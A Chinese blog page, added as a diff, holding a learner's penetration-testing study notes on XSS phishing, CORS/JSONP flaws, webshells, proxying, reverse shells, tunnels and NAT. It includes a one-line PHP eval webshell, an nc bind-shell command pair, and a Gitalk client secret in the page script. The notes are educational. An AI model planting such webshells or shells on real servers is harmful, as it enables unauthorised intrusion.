@@ -1,0 +1,863 @@
+<!DOCTYPE html>
+
+
+<html lang="zh-CN">
+  
+
+    <head>
+      <meta charset="utf-8" />
+        
+      <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=1"
+      />
+      <title>随谈 |  小张之栈</title>
+  <meta name="generator" content="hexo-theme-ayer">
+      
+      <link rel="shortcut icon" href="/favicon.ico" />
+       
+<link rel="stylesheet" href="/dist/main.css">
+
+      
+<link rel="stylesheet" href="/css/fonts/remixicon.css">
+
+      
+<link rel="stylesheet" href="/css/custom.css">
+ 
+      <script src="https://cdn.staticfile.org/pace/1.2.4/pace.min.js"></script>
+       
+ 
+
+      <link
+        rel="stylesheet"
+        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
+      />
+      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>
+
+      <!-- mermaid -->
+      
+      <style>
+        .swal2-styled.swal2-confirm {
+          font-size: 1.6rem;
+        }
+      </style>
+    </head>
+  </html>
+</html>
+
+
+<body>
+  <div id="app">
+    
+      <canvas class="fireworks"></canvas>
+      <style>
+        .fireworks {
+          position: fixed;
+          left: 0;
+          top: 0;
+          z-index: 99999;
+          pointer-events: none;
+        }
+      </style>
+      
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-随谈"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+  
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  随谈
+</h1>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2023/09/26/%E9%9A%8F%E8%B0%88/" class="article-date">
+  <time datetime="2023-09-25T16:21:20.000Z" itemprop="datePublished">2023-09-26</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a> / <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F/%E7%BD%91%E7%BB%9C/">网络</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">5.2k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">19 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h2 id="xss钓鱼有感"><a href="#xss钓鱼有感" class="headerlink" title="xss钓鱼有感"></a>xss钓鱼有感</h2><p>已知，存储型xss的钓鱼原理，是使得受害者去主动访问攻击者的服务器上的文件，从而携带受害者的信息，存到攻击者的数据库上面</p>
+<p>那么这上面有一个问题，搭建渗透平台的时候，我是采用了主机作为攻击者，虚拟机作为受害者</p>
+<p>就拿最近的cors漏洞讲，假如我的虚拟机ip是78，我的主机ip是100</p>
+<p>我虚拟机和主机之间的文件是可以通过浏览器互相访问的</p>
+<p><strong>虚拟机：</strong></p>
+<p>​	“登录”了靶场后，”主动访问“了主机的1.html文件，导致一些信息被盗走</p>
+<p><strong>主机：</strong></p>
+<p>我主机作为攻击者怎么讲，写了一个1.html文件</p>
+<p>它带着一些参数值，去访问我本机的另一个2.php文件</p>
+<p>php文件接收到这些值后，写进本机的数据库中去</p>
+<p>完成了钓鱼操作</p>
+<p>那么这里，如果代入到真实环境中，是怎样的？</p>
+<p>如何使得<strong>受害者</strong>访问 <strong>攻击者</strong>的资源呢？</p>
+<blockquote>
+<p>看来攻击者也需要一个<strong>部署在公网上的服务器</strong></p>
+</blockquote>
+<h2 id="跨域"><a href="#跨域" class="headerlink" title="跨域"></a>跨域</h2><p>当时和同学讨论外网内网问题，是在学习到跨域访问这一知识的时候想起来的</p>
+<p>跨域，涉及到一个前置知识叫，同源策略，该策略，大意是指，当前网页呢，会通过js去加载外部资源，这个外部资源必须和当前网页的 <strong>来源</strong>，<code>同协议、同域名、同端口</code>；</p>
+<p>如何跨域，除了已知的标签 script、iframe，等等</p>
+<p>还有jsonp方式，cors方式</p>
+<p>这里为了记忆深刻，再输出一下</p>
+<p>jsonp，顾名思义，针对的是有json格式输出的跨域</p>
+<p>jsonp的跨域原理，是基于回调函数，将json值通过函数处理输出出来的，它还特别用到了不受同源策略影响的script标签</p>
+<p>缺点就是 只能通过GET获取，然后是基于回调函数</p>
+<p>其漏洞呢，</p>
+<p>1.就是说攻击者知道其调用函数，构造一个同名函数，但函数体可能是恶意的方法，比如location.href到攻击者的服务器</p>
+<p>2.csrf，它这个漏洞在于，<strong>没有限定callback的函数名</strong>，让受害者在登录状态下触发，可能是超链接或其它方式，主动去访问攻击者预先写好的文件</p>
+<p>防御呢，对函数名白名单啊，限制url长度啊等等</p>
+<p>cors，跨域资源共享，怎么做的，需要用户所访问的后端文件有指明Allow-Origin，否则，浏览器是可以请求到，但是得不到服务器响应</p>
+<p>其漏洞也是一个csrf，它的漏洞在于，<strong>没有对Allow-Origin限制</strong>，<del>复现过程比jsonp感觉要简单点，我主机去获取数据写进数据库的时候反正是成功了，jsonp的那个json值不好处理，容易为空</del></p>
+<p>防御也是，指明允许的origin，白名单等</p>
+<p>这里当时在纠结个什么事情呢，</p>
+<p>我在主机的浏览器去访问虚拟机的靶场，比如我会 <code>xxx.ip/Dorabox</code>，然后就访问到了</p>
+<p>这个为什么不算是跨域呢，首先跨域问题主要针对的是：</p>
+<p><strong>前端js请求外部资源问题才会发生</strong></p>
+<p>噢，我好像确实访问虚拟机的时候，都是php文件，貌似没有访问过html文件呢</p>
+<p>这个行为就好像是 访问物理服务器上的文件，没有本质区别</p>
+<p>当然从技术层面讲，涉及到 <strong>网络通信</strong>、<strong>同源策略</strong></p>
+<p>比如http请求嘛，对吧，但访问自己的本地文件不需要，直接读取</p>
+<p><strong>！！！！主机和虚拟机是算作同一域名的，这个为什么，忘了，到时候再看看，标记一下</strong></p>
+<p>然后想说什么来着。。。</p>
+<h2 id="webshell工具"><a href="#webshell工具" class="headerlink" title="webshell工具"></a>webshell工具</h2><p>关于渗透这个东西</p>
+<p>攻击者可以渗透的东西，拿网页来说</p>
+<p>攻击者接触的第一个点就是web服务器，准确来说是部署在公网上的web前端</p>
+<p>而这个web服务器，有一点不清楚，通过开发的前后端分离，</p>
+<p>到底是前端后端都在同一个服务器呢，还是在两个不同服务器呢？</p>
+<p>好像也没什么影响，就拿<a target="_blank" rel="noopener" href="http://t.csdn.cn/GAfyy">webshell</a>来说</p>
+<p>找到一个文件上传的点，就把小马啊送到了服务器上面，那使用工具就可以去连接上去</p>
+<p>文件上传漏洞的前提哈：1.传的上去；2.文件会被解析；3.知道绝对路径</p>
+<p>这个路径，可以通过字典遍历枚举得到</p>
+<p>关于webshell工具为什么有这种效果</p>
+<p><del>嘶，没考虑过</del></p>
+<p>首先往后端php服务器放了个a.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这个效果就是：用post方法接收变量pass,把变量pass里面的字符串当做php代码来执行</p>
+<p>虚拟终端 其实也是调用系统命令 system 发送一次请求获取一次结果然后显示</p>
+<p><strong>！！！！！问题是为什么可以输入路径，加pass就可以得到webshell呢</strong></p>
+<blockquote>
+<p>解：无异于用bp在repeater模块的每一次post请求，如 <code>system(&quot;ls&quot;)</code>，这种简单交互</p>
+<p>只不过websehll工具与之相比，建立了远程执行命令的通道，省略了system()，可以直接在虚拟终端使用 <code>ls</code>；</p>
+</blockquote>
+<p>传统的小马特征很明显，容易被检测到，后面都是搞不死马了，也即是内存马，无文件类型</p>
+<p><strong>！！！！！内存马</strong></p>
+<p>渗透只要拿到web服务器的权限，想办法提权，拿到管理员权限，有域控去弄域控的</p>
+<h2 id="域名与ip"><a href="#域名与ip" class="headerlink" title="域名与ip"></a>域名与ip</h2><p>在做hack the box的时候，遇到一个题，我在&#x2F;etc&#x2F;hosts文件下添加如下信息</p>
+<blockquote>
+<p>10.10.11.217 topology.htb  #假如是普通页面</p>
+<p>10.10.11.217 latex.topology.htb #假如是信息提交页面</p>
+<p>10.10.11.217 dev.topology.htb #假如是登录页面</p>
+</blockquote>
+<p>我用ip访问时，进入的是一个普通页面，也即是说，它是一个<strong>默认</strong>的页面</p>
+<p>而已知，访问域名时就是在访问对应的ip，这三个域名的解析地址都是相同的，但为什么内容(呈现的页面)不一样？</p>
+<p>针对上面的问题，假设是一个Apache http服务器，它的配置近似如下：</p>
+<p>&#x2F;etc&#x2F;apache2&#x2F;sites-available&#x2F;下</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">VirtualHost</span> *<span class="attr">:80</span>&gt;</span></span><br><span class="line">   ServerName topology.htb</span><br><span class="line">   DocumentRoot /var/www/topology</span><br><span class="line">   # 其他配置项</span><br><span class="line"><span class="tag">&lt;/<span class="name">VirtualHost</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">VirtualHost</span> *<span class="attr">:80</span>&gt;</span></span><br><span class="line">   ServerName latex.topology.htb</span><br><span class="line">   DocumentRoot /var/www/latex</span><br><span class="line">   # 其他配置项</span><br><span class="line"><span class="tag">&lt;/<span class="name">VirtualHost</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">VirtualHost</span> *<span class="attr">:80</span>&gt;</span></span><br><span class="line">   ServerName dev.topology.htb</span><br><span class="line">   DocumentRoot /var/www/dev</span><br><span class="line">   # 其他配置项</span><br><span class="line"><span class="tag">&lt;/<span class="name">VirtualHost</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>根据域名来提供不同的网页内容</p>
+<p>所以使用域名访问时，仍然解析成ip地址，且建立http连接，只不过host中携带了域名，所以web服务器根据这个Host字段，选择相应的主机配置，呈现不同内容！</p>
+<p>ip地址与域名的关系：域名比起ip(特别是有多个ip)这种数字相对来说更容易记忆。</p>
+<h2 id="bp二层代理原理"><a href="#bp二层代理原理" class="headerlink" title="bp二层代理原理"></a>bp二层代理原理</h2><p><strong>首先，我仅限理论上的讨论，没有做出违法的事情！！！一切以知识学习为主！！</strong></p>
+<p>​     </p>
+<p>上游代理，为了隐藏真实公网ip。</p>
+<p>为什么公网ip会显示非真实ip，达到隐藏目的？(当时讨论的好像不是这个呢？)</p>
+<p>​    </p>
+<p>流量流程如下：</p>
+<blockquote>
+<p>一般情况下，浏览器-&gt;服务器</p>
+<p>有了bp，浏览器-&gt;bp-&gt;服务器，(就起一个拦截作用)</p>
+<p>bp二层代理后，<strong>浏览器-&gt;bp-&gt;远程服务器-&gt;目标服务器</strong>，结果是会以远程服务器的公网ip去访问目标服务器</p>
+</blockquote>
+<p>这个流程已经说明白了，是通过远程服务器去访问的目标服务器，那么目标服务器肯定是，谁访问它，就记录谁的ip。</p>
+<p><strong>所以为什么呢？</strong>我知道是这个流程，底层原理是什么？我只知道它实现了这个，它怎么实现的呢？</p>
+<p>首先看，<strong>浏览器-&gt;bp-&gt;服务器</strong></p>
+<p>怎么理解，现在服务器的直接对象是谁，是bp，接收也好，返回响应也好，直接对象都是bp。这样说的话：</p>
+<p>那<strong>访问一个可以查询本机公网ip的网址时，为什么公网ip不是bp的地址，仍然是本机公网ip？</strong></p>
+<p>答：我们先看我们怎么操作的，先将代理设置为127.0.0.1:8080，然后再在bp上的 <strong>proxy Listeners</strong> 监听这个127.0.0.1:8080，用来监听、接收来自浏览器的http请求。</p>
+<p>这就是本地监听了，意味着代理服务器运行在本地计算机上嘛。</p>
+<p>这意味着，代理服务器并不会路由流量到外部网络，而是将流量留在本地计算机上，那么流出到互联网上的请求仍然会显示真实公网IP地址。</p>
+<p>这里有个重要的点，bp作为软件，它起一个<strong>监听</strong>的作用，监听的是本地的8080端口。</p>
+<p>好，在回答二层代理技术之前，先看一个流量路径：</p>
+<p><strong>浏览器-&gt;科学软件-&gt;?-&gt;服务器</strong></p>
+<p>怎么操作的？</p>
+<p>答：将本机的代理设置为一个127.0.0.1:1234端口；这个科学软件和bp一样，<strong>监听</strong>了本机的1234端口；所以由浏览器发出的流量，<strong>被路由</strong>到了科学软件上，科学软件接收到流量后，(<strong>选择节点</strong>)， 将其路由到<strong>远程服务器</strong>，流量最终离开本机网络，通过远程服务器到达目标机</p>
+<p>这个过程，流量不是从浏览器直接发到目标机，目标机只会看到流量来自 <strong>科学软件或远程服务器的IP地址</strong>。</p>
+<p>如果科学软件里，你选择了个无效<strong>节点</strong>，那最终就没达到隐藏效果。</p>
+<p>经过上面两个流量路径，我们总结一个共同点：</p>
+<blockquote>
+<p>流量路由到本地计算机上的一个<strong>特定端口</strong>，这个特定端口是<strong>被软件监听</strong>到的</p>
+</blockquote>
+<p>然后分析一下：</p>
+<p>第一个路径，用来拦截；第二个路径用来隐藏。</p>
+<p>二者侧重点不同。</p>
+<p>那么作为一个贪心的人，能不能有一个 <strong>既要又要</strong> 的方法呢？</p>
+<p>所以最后讨论bp的二层代理原理：</p>
+<p>流量路径为：<strong>浏览器-&gt;bp-&gt;(科学软件)-&gt;远程服务器-&gt;目标服务器</strong></p>
+<p>这就清晰了。</p>
+<p><strong>浏览器-&gt;bp</strong>，正常的拦截</p>
+<p><strong>bp-&gt;(科学软件)<strong>，bp再设置一个上游代理，这个代理将bp发出的请求转发到另一个端口上，然后有另一个软件</strong>监听</strong>到该端口流量，并接收</p>
+<p>(科学软件)-&gt;节点，选择节点，嗯，懂？</p>
+<p>节点-&gt;目标服务器，skr！</p>
+<h2 id="内网访问内网"><a href="#内网访问内网" class="headerlink" title="内网访问内网?!"></a>内网访问内网?!</h2><p>再做一次回顾吧。</p>
+<p>我们看下面的访问路径：</p>
+<blockquote>
+<p>我的个人PC -&gt; <a target="_blank" rel="noopener" href="http://www.baidu.com/">www.baidu.com</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.baidu.com/">www.baidu.com</a> -&gt; 我的个人PC</p>
+</blockquote>
+<p>这个就相当于：<strong>我ping百度可以，baidu能ping我吗？</strong></p>
+<p>我和百度不在同一个内网，但是它上线了，我可以ping到它；</p>
+<p>但同时也暴露了我的公网ip，它能不能ping我？</p>
+<p>我要求远在他乡的同学告诉我它的公网ip，并且，关闭防火墙。</p>
+<p>防火墙，对于一个PC来讲，只<strong>管入站</strong>不管出站，怎么理解，<code>孙悟空给师父画了一个圈，外人进不来，但不妨碍师父主动出去</code>。</p>
+<p><strong>下载命令</strong></p>
+<p>linux：wget，curl，java，python等</p>
+<p>windows：powershell、certutil等</p>
+<p>根据内置的下载命令，如果有一个漏洞是命令执行漏洞，那就可以通过该漏洞在目标机下载木马、反弹shell</p>
+<p><strong>反弹shell的正向连接、反向连接</strong></p>
+<p>已知PC A，和PC B(有防火墙)</p>
+<p><strong>A去监听一个端口，B通过端口去访问A(公网地址)，A监听到了</strong></p>
+<p>对一个PC A来讲，<strong>它监听B的连接</strong>，这叫<strong>反向</strong></p>
+<blockquote>
+<p>A守株待兔，被动一方，对A来讲，这是一个反向连接</p>
+<p>比如，攻击者发现目标机有防火墙，或者目标机在内网，或目标机ip动态变化时用</p>
+</blockquote>
+<p>对一个PC B来讲，<strong>它主动通过端口访问A</strong>，这个行为，叫<strong>正向</strong></p>
+<blockquote>
+<p>B投怀送抱，主动一方，对B来讲，这是一个正向连接</p>
+<p>比如，ssh、远程桌面连接，这叫正向连接</p>
+</blockquote>
+<p>如果A有了防火墙，A监听一个端口，B通过这个端口访问A，B访问不了，A也监听不到了，因为A的入站规则屏蔽了B；</p>
+<p><strong>为什么要正向&#x2F;反向连接？</strong></p>
+<p>定义一个C(客户端)和一个S(服务端)，</p>
+<p>所谓正向连接，该连接就是要将 <strong>S能看到的东西，我C要主动去看</strong></p>
+<p>所谓反向连接，该连接就是要将 <strong>S能看到的东西，我等着让S给我看</strong></p>
+<p>反正所谓正向&#x2F;反向，是看你从A看，还是从B看；</p>
+<p>对于攻击者来说，只要它是<strong>正向连接的发起者</strong>，是<strong>反向连接的接收者</strong>即可</p>
+<p><strong>弹shell</strong>的正向这个问题，其实这样理解，</p>
+<p>如果S，<code>nc -lvp 233 -e /bin/bash</code></p>
+<p>而C，<code>nc S的ip 233</code>，那么C就获得了S的权限，如果没有nc工具，要么想办法让S下载一个，要么用 <strong>bash反弹</strong></p>
+<p>例子就是：pikachu靶场的命令执行漏洞</p>
+<p>假设B有个这个漏洞，A可以访问B这个有漏洞的页面，对A来讲，步骤如下：</p>
+<ol>
+<li>在B下载一个nc.exe</li>
+<li>在A本机去监听一个端口</li>
+<li>在B用这个nc去访问A的端口</li>
+<li>A监听到了B的shell</li>
+</ol>
+<p>对A来讲这是个什么连接，<strong>反向</strong>哈。</p>
+<h3 id="常见隧道"><a href="#常见隧道" class="headerlink" title="常见隧道"></a>常见隧道</h3><p><strong>网络层</strong>：</p>
+<blockquote>
+<p>icmp隧道，一般用icmpsh工具去代替ping命令</p>
+<p>ipv6</p>
+<p>gre</p>
+</blockquote>
+<p><strong>传输层</strong>：</p>
+<blockquote>
+<p>TCP协议，nc监听</p>
+<p>端口转发，lcx工具(绕防火墙)</p>
+</blockquote>
+<p><strong>应用层</strong>：</p>
+<blockquote>
+<p>DNS隧道</p>
+</blockquote>
+<p><strong>总结</strong></p>
+<p>所以个人计算机还是要开启防火墙，即使公网ip泄露也较为安全</p>
+<p>内网访问内网，都是<strong>去建立隧道</strong>，比如ssh，远程桌面连接啊，vpn、内网穿透之类的。</p>
+<h2 id="公网ip？！"><a href="#公网ip？！" class="headerlink" title="公网ip？！"></a>公网ip？！</h2><p>PC之所以可以上网，是因为ISP给路由器一个公网ip，这个公网ip使得我们可以进入互联网。</p>
+<p>那建站的时候，买个域名，云服务器肯定也分配了一个公网ip，这两个公网ip怎么说？</p>
+<p>对于普通家庭来讲，ISP分配的公网ip是<strong>动态</strong>的，当你有联网需要才会给你从闲置的ip池中分配一个，不需要了就回收</p>
+<p>ISP有静态的，但这个就用于商业或者专业用户了。</p>
+<p>！！！自己用ISP分配的公网ip，自建了一个IIS服务器，且关闭了防火墙，为什么在自己的浏览器上访问该服务器时，无法访问？</p>
+<p><strong>答</strong>：一般不会这样搞，首先关闭防火墙不安全；其次，普通用户的公网ip是动态分配的，不稳定。</p>
+<p>首先思路要这样捋一下，给一个设置情形吧：</p>
+<p>内网ip为192.168.1.49，我如果搭建了一个网站，域名叫hao123.com。去百度输入ip，回车，呈现出来的一个ip叫171.x.x.x；这个叫做<strong>外网出口</strong>，由于NAT协议的关系，可以使得一个内网下的多台电脑，共享同一个<strong>外网出口</strong>。如果要别人去访问<strong>网站</strong>怎么办：进到路由器的管理页面，有一个功能叫做<strong>端口映射</strong>，输入自己的内网ip，192.168.1.49，内网端口为80(可能不让用)，外网端口为80，添加这种映射关系。</p>
+<p>对于攻击者来讲：访问hao123.com，DNS解析的ip地址为171.x.x.x。实际上架设的web服务器在192.168.1.49下。那攻击者去扫描的是171.x.x.x的端口协议，真实网站是192.168.1.49，所以攻击者扫不到。攻击者就会知道，实际的网络架构应该是什么样子了。</p>
+<p>补充：</p>
+<blockquote>
+<p>有公网ip：登录路由器后台进行端口映射</p>
+<p>无公网ip：内网穿透工具去将内网端口映射到公网上，通过公网访问内网 (常用，不需要公网ip)</p>
+</blockquote>
+<h2 id="输入url并回车的过程"><a href="#输入url并回车的过程" class="headerlink" title="输入url并回车的过程"></a>输入url并回车的过程</h2><p>首先可以引入一个渲染</p>
+<ol>
+<li>浏览器访问html文件，并发送请求</li>
+<li>浏览器从头开始<strong>返回</strong>html文件，<strong>构建dom</strong>，遇到link标签，则<strong>返回</strong>css文件，<strong>去构建cssom</strong></li>
+<li>解析css文件的同时，继续解析html文件，遇到script标签，去<strong>下载js文件</strong></li>
+<li>**仅当cssom构建完毕，执行js <strong>；但</strong>此时html解析会停止(如果对js请求声明了异步则不会阻塞)**，因为js会阻塞html解析(表面现象可以这样想，因为js是可以操作dom和css的)</li>
+<li>js执行完之前什么内容都没有，<strong>执行完之后，且DOM构建完后</strong>，会形成渲染树</li>
+<li><strong>布局</strong>，获取渲染树的结构、节点位置和大小，就是对盒子的排列和嵌套</li>
+<li><strong>绘制</strong>，将渲染树以像素形式绘制在页面</li>
+</ol>
+<p>dom可以部分解析，cssom不能部分解析，一个例子可以说明</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">    <span class="attribute">font-size</span>:<span class="number">32px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">body</span> <span class="selector-tag">div</span>&#123;</span><br><span class="line">    <span class="attribute">font-size</span>:<span class="number">16px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果css部分解析，只解析了32px的，那就乱套了</p>
+<blockquote>
+<p>参考：B站技术蛋老师</p>
+</blockquote>
+<p>对于整体的过程而言，要从浏览器与目标机开始，这个有些细节我老忘：</p>
+<ol>
+<li>对路由器来讲，它怎么将公网ip转化为对应的私有ip呢？它怎么知道是哪个私有ip(假设有多个)呢？</li>
+<li>从请求端的路由器将请求发到互联网，再到服务器路由器的过程？</li>
+<li>应用层干了什么事？</li>
+<li>互联网中的路由器之间的包只改变了MAC吗</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">我先回顾一下：</span><br><span class="line">1.我在浏览器输入一个example.com并回车</span><br><span class="line">2.浏览器去域名解析为对应ip</span><br><span class="line">(查找顺序:本地DNS缓存-&gt;hosts文件-&gt;本地DNS服务器(比如8.8.8.8/114.114.114.114)-&gt;根.-&gt;顶级.-&gt;权威)</span><br><span class="line">DNS具体起的作用，以四层模型为例</span><br><span class="line">应用层：由DNS去生成一个请求，类似于&quot;告诉我example.com的ip&quot; -&gt;</span><br><span class="line">传输层：源端口+目的端口封装头部</span><br><span class="line">网络层：源ip+目的ip(8.8.8.8)封装头部</span><br><span class="line">它找不到这个8.8.8.8，就去找网关，即路由器的ip,192.168.1.1</span><br><span class="line">网际层：数据链路层去头部添加源MAC+网关MAC(ARP协议)，后面也会封装一些校验值；物理层就通过网卡发送这个数据包</span><br></pre></td></tr></table></figure>
+
+<p>不行，还是要画个图</p>
+<p><img src="/../../../Typora/img111/image-20231123120737757.png" alt="图示"></p>
+<p>上面的数据包已经发到交换机了，交换机就两层</p>
+<blockquote>
+<p>数据链路层</p>
+<p>物理层</p>
+</blockquote>
+<p>流程为物理层-&gt;数据链路层，根据MAC地址，是找到了路由器MAC地址为CC的端口</p>
+<p>路由器三层</p>
+<blockquote>
+<p>网络层</p>
+<p>数据链路层</p>
+<p>物理层</p>
+</blockquote>
+<p>流量路径1：物理层-&gt;数据链路层(认出了CC是自己的MAC，去掉)-&gt;网络层(8.8.8.8不认识)，去发到互联网上(WAN口)，NAT转化一下源ip，源端口也随机改变，<strong>保留映射关系</strong></p>
+<p>流量路径2：数据链路层添加源MAC：DD 和下一条路由器的MAC</p>
+<p>互联网上的路由器之间重复上述操作，最终找到了DNS服务器，从下往上解封装，服务器处理这个请求，给个响应告诉对应IP，然后从上往下封装，之后就是一个往回传的过程了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">3.发送请求(把example.com的页面给我)</span><br><span class="line">应用层封装这个请求-&gt;</span><br><span class="line">传输层(源端口，目的端口，tcp传输)-&gt;</span><br><span class="line">网络层(源ip:192.168.1.4，目的ip：2.2.2.2)-&gt;</span><br><span class="line">网际层(源MAC、目的MAC)-&gt;</span><br><span class="line">传输到路由器(路由器知道有访问互联网的请求，问运营商服务器要公网ip，进行一次NAT转换，源ip变为：3.3.3.3)，源端口改变，保留映射关系</span><br><span class="line">4.该数据包发到互联网，互联网有很多路由器，直到目标机路由器接收到该报文</span><br><span class="line">5.目标机路由器将目的ip进行NAT，目的ip变为10.10.1.2</span><br><span class="line">6.解封装过程：网际层-&gt;网络层-&gt;传输层-&gt;应用层-&gt;返回</span><br><span class="line">7.封装，然后往回传</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>参考：ytb的不良林</p>
+</blockquote>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>版权声明： </strong>
+          
+          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2023/09/26/%E9%9A%8F%E8%B0%88/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C/" rel="tag">网络</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+      <a href="/2023/09/26/%E8%B8%A9%E7%82%B9/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            渗透思想
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2023/09/25/dpwwn/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">dpwwn</div>
+      </a>
+    
+  </nav>
+
+  
+   
+<div class="gitalk" id="gitalk-container"></div>
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/gitalk/1.7.2/gitalk.min.css">
+
+
+<script src="https://cdn.staticfile.org/gitalk/1.7.2/gitalk.min.js"></script>
+
+
+<script src="https://cdn.staticfile.org/blueimp-md5/2.19.0/js/md5.min.js"></script>
+
+<script type="text/javascript">
+  var gitalk = new Gitalk({
+    clientID: '93da8388ad1469a8be66',
+    clientSecret: '9dea6314b14ae1877632f2bcbe0a639dd4485bb1',
+    repo: 'blogtalk',
+    owner: 'ak005469075',
+    admin: ['ak005469075'],
+    // id: location.pathname,      // Ensure uniqueness and length less than 50
+    id: md5(location.pathname),
+    distractionFreeMode: false,  // Facebook-like distraction free mode
+    pagerDirection: 'last'
+  })
+
+  gitalk.render('gitalk-container')
+</script>
+
+  
+    
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2023-2024
+        <i class="ri-heart-fill heart_icon"></i> 是羽泪云诶
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></span>
+  <span class="division">|</span>
